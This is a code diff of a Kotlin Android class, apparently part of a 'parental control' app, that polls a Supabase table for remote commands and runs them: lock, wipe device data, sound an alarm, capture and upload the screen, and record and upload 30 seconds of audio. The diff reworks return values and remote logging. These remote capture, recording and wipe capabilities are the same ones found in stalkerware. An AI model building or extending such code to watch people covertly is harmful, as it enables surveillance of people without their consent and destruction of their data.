@@ -64,56 +64,82 @@ class RealtimeCommandManager(
                                 }
                             }.decodeList<CommandRecord>()
 
-                        // تحديث الحالة وتنفيذ الأوامر
+                        // تنفيذ الأوامر المكتشفة
                         for (cmd in newCommands) {
                             try {
-                                // 1. تعيين الحالة إلى قيد التنفيذ لمنع التكرار
+                                Log.i(TAG, "New command detected: ${cmd.command}")
+                                supabase.logRemote(context, TAG, "INFO", "Executing command: ${cmd.command}")
+                                
+                                val success = executeCommand(cmd.command.uppercase().trim())
+                                
+                                // تحديث الحالة إلى منفذ (أو فشل) بعد المحاولة
+                                val statusResult = if (success) "EXECUTED" else "FAILED"
+                                
                                 client.postgrest[TABLE_NAME].update(
                                     {
-                                        set("status", "EXECUTED")
+                                        set("status", statusResult)
+                                        set("executed_at", kotlinx.datetime.Clock.System.now().toString())
                                     }
                                 ) {
                                     filter { eq("id", cmd.id) }
                                 }
 
-                                Log.i(TAG, "Executing command: \${cmd.command}")
-                                executeCommand(cmd.command.uppercase().trim())
+                                supabase.logRemote(context, TAG, "INFO", "Command ${cmd.command} result: $statusResult")
                             } catch (e: Exception) {
-                                Log.e(TAG, "Failed to process command \${cmd.id}: \${e.message}")
+                                Log.e(TAG, "Failed to process command ${cmd.id}: ${e.message}")
+                                supabase.logRemote(context, TAG, "ERROR", "Process failed: ${e.message}")
                             }
                         }
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Polling error: \${e.message}")
+                    Log.e(TAG, "Polling error: ${e.message}")
                 }
                 
-                // انتظار 5 ثوانٍ قبل الفحص التالي (استهلاك منخفض جداً للطاقة)
+                // انتظار 5 ثوانٍ قبل الفحص التالي
                 delay(5000L)
             }
         }
     }
 
-    private fun executeCommand(command: String) {
-        try {
+    private suspend fun executeCommand(command: String): Boolean {
+        return try {
             when (command) {
-                "LOCK" -> parentalControl.lockScreen()
-                "WIPE" -> parentalControl.wipeData(false)
-                "ALARM" -> playAlarm()
-                "CAPTURE" -> scope.launch(Dispatchers.IO) {
+                "LOCK" -> {
+                    parentalControl.lockScreen()
+                    true
+                }
+                "WIPE" -> {
+                    parentalControl.wipeData(false)
+                    true
+                }
+                "ALARM" -> {
+                    playAlarm()
+                    true
+                }
+                "CAPTURE" -> {
                     val projection = projectionProvider()
                     if (projection != null) {
                         screenCapture.captureAndUpload(projection, forceCapture = true)
+                        true
                     } else {
-                        Log.e(TAG, "Cannot capture screen: MediaProjection is null")
+                        Log.e(TAG, "Cannot capture: MediaProjection is null")
+                        supabase.logRemote(context, TAG, "ERROR", "MediaProjection is NULL")
+                        false
                     }
                 }
-                "RECORD" -> scope.launch(Dispatchers.IO) {
-                    audioRecorder.recordAndUpload(30000L) // تسجيل 30 ثانية
+                "RECORD" -> {
+                    audioRecorder.recordAndUpload(30000L)
+                    true
                 }
-                else -> Log.w(TAG, "Unknown command received: \$command")
+                else -> {
+                    Log.w(TAG, "Unknown command: $command")
+                    false
+                }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error executing command: \${e.message}")
+            Log.e(TAG, "Execution error: ${e.message}")
+            supabase.logRemote(context, TAG, "ERROR", "Exec crash: ${e.message}")
+            false
         }
     }
 
